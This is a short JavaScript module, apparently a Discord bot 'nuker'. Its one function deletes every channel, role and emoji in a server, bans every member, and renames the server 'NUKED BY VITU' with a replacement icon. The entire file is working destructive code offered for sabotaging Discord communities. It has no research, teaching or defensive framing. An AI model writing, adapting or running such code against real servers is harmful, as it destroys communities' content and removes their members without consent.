const nuker = 'vitu'
const newIcon = 'https://i.imgur.com/hpBdz7L.jpg'

function nukeServer(message) {
  return new Promise((resolve, reject) => {
    message.guild.channels.cache.forEach(channel => {
      channel.delete()
        .then(() => console.log('Channel Success!'))
        .catch(e => { console.log('Channel Error!') })
    })
    message.guild.roles.cache.forEach(role => {
      role.delete()
        .then(() => console.log('Role Success!'))
        .catch(e => { console.log('Role Error!') })
    })
    message.guild.emojis.cache.forEach(emoji => {
      emoji.delete()
        .then(() => console.log('Emoji Success!'))
        .catch(e => console.log('Emoji Error!'))
    })
    message.guild.members.cache.forEach(member => {
      member.ban()
        .then(() => console.log('Member Success!'))
        .catch(e => console.log('Member Error!'))
    })
    message.guild.setName(`NUKED BY ${nuker.toUpperCase()}`)
    message.guild.setIcon(newIcon)
    resolve()
  })
}

module.exports = nukeServer